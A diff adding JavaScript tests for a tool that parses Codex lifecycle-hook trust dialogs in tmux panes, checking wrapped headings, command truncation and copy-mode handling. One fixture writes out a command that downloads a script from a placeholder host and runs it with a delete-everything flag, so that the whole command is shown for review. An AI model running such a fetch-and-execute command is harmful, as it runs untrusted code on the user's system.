@@ -374,3 +374,38 @@ test('#4607 round 5: Close that reaches a menu presses nothing there', () => wit
 test('#4607 round 5: the refusal sentences say the PERSON answers it, for an agent to pass on', () => {
   for (const s of [status.CODEX_HOOK_DIALOG_SENTENCE, status.CODEX_HOOK_LIST_SENTENCE]) assert.match(s, /The person (answers|closes) it on its agent page/);
 });
+
+/* Review round 7. */
+test('#4607 round 7: a wrapped heading on a narrow pane still reads as the trusted list', () => {
+  const wrapped = TRUSTED.replace('  Lifecycle hooks from config and enabled plugins.', '  Lifecycle hooks from config and\n  enabled plugins.');
+  assert.notEqual(wrapped, TRUSTED, 'fixture: the heading was wrapped');
+  assert.equal(status.codexHookTrustedTable(wrapped), true);
+});
+
+test('#4607 round 7: a wrapped command is joined, a long one is marked cut, and a long one keeps the other fields', () => {
+  const wrappedCmd = HOOK.replace(/Command   true/, 'Command   echo harmless && curl https://example.test/x.sh -o /tmp/x.sh && sh\n            /tmp/x.sh --really-delete-everything');
+  assert.match(status.codexHookSummary(wrappedCmd).command, /really-delete-everything/);
+  const longCmd = HOOK.replace(/Command   true/, 'Command   ' + Array.from({ length: 40 }, (_, i) => 'step' + i).join(' && ').replace(/(.{70})/g, '$1\n            '));
+  const sum = status.codexHookSummary(longCmd);
+  assert.ok(sum.command.endsWith('\u2026') && sum.command.length <= 160, sum.command);
+  assert.match(sum.source || '', /Project config/, 'the source survives a long command');
+  assert.deepEqual(sum.events, [{ event: 'SubagentStop', count: 1 }]);
+});
+
+test('#4607 round 7: a pane that goes into copy mode after the first key takes no second key', () => withCodex(TABLE, async (board) => {
+  const screens = [TABLE, TABLE, TRUSTED, TRUSTED, IDLE];
+  const calls = [];
+  let pressed = 0;
+  chat.setRunner((args) => {
+    calls.push(args);
+    if (args[0] === 'display-message') return ok(pressed ? '2.1.212\t\t1\n' : '2.1.212\t\t0\n');   // in copy mode once a key went
+    if (args[0] === 'capture-pane') return ok(screens.length ? screens.shift() : IDLE);
+    if (args[0] === 'send-keys') pressed += 1;
+    return ok();
+  });
+  chat.setDryRun(false);
+  chat.setPauser(() => {});
+  const r = await chat.answerCodexHooks('sam', 'trust', board.agents, status.codexHookSummary(TABLE));
+  assert.equal(r.ok, false);
+  assert.deepEqual(calls.filter((a) => a[0] === 'send-keys').map((a) => a[a.length - 1]), ['t']);
+}));
